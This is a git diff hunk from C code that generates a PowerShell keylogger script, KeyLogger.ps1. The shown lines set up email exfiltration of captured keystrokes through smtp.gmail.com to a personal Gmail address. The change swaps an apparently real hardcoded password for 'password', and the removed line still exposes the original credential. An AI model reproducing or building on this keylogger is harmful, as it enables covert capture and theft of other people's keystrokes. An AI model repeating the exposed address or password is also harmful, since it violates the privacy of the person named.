@@ -90,7 +90,7 @@ void sentMail(char* input) //Debian-sudo apt-get install -y powershell CentOs-su
 {
     FILE *fp=fopen("KeyLogger.ps1","ab+");
     fprintf(fp,"$Myemail=\"salmanhussain9057@gmail.com\"\n");
-    fprintf(fp,"$Mypass=\"gaandmarale\"\n");
+    fprintf(fp,"$Mypass=\"password\"\n");
     fprintf(fp,"$SMTP=\"smtp.gmail.com\"\n");
     fprintf(fp,"$to=\"salmanhussain9057@gmail.com\"\n");
     fprintf(fp,"$Subject=\"KEYLOGGER\"\n");
